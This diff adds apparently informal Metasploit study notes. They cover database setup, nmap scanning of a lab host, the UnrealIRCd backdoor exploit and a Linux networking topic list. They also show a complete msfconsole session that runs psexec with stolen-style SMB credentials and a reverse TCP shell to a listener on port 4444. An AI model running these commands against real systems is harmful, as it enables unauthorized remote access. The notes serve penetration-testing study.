@@ -1,0 +1,65 @@
+msfdb init
+nmap = find what ports are open on the computer
+db_nmap 10.0.2.5
+
+db_status
+
+location - cd /usr/share/metasploit-framework
+seach type exploit
+
+search type:exploit platform: linux
+use exploit/unix/irc/unreal_ircd_3281_backdoor
+
+show payloads
+Search type:payload
+set PAYLOAD
+search type:payloads platform:linux
+cat /root/.msf4/history
+
+
+exploit is a vulnerability: software that exploits that
+payloads are the bad things that you want to ruN
+use exploit (path)
+or
+use exploit/multi/halder
+show targets = to see the types of os you can attack with that exploit
+
+-----------------------------------------------------------------------------------------------------------------------
+
+add-apt-repository universe
+
+
+
+
+firewallD 
+SCP/SSH file transfer
+VI 
+/etc/network/interfaces - debian
+/etc/sysconfig/network-scripts - red hat
+setup static vs setup dhcp
+ARP tables
+scapy - Python programming packet manipulator
+NAT/masquerade 
+IP Forwarding
+setting links
+
+----------------------------------------------------------------------------
+msf > use exploit/windows/smb/psexec
+msf exploit(psexec) > set RHOST 192.168.1.100
+RHOST => 192.168.1.100
+msf exploit(psexec) > set PAYLOAD windows/shell/reverse_tcp
+PAYLOAD => windows/shell/reverse_tcp
+msf exploit(psexec) > set LHOST 192.168.1.5
+LHOST => 192.168.1.5
+msf exploit(psexec) > set LPORT 4444
+LPORT => 4444
+msf exploit(psexec) > set SMBUSER victim
+SMBUSER => victim
+msf exploit(psexec) > set SMBPASS s3cr3t
+SMBPASS => s3cr3t
+msf exploit(psexec) > exploit
+
+----------------------------------------------------------------------------
+
+root@kali:~# echo “print_status(“Hello World”)” > /usr/share/metasploit-framework/scripts/meterpreter/helloworld.rb
+
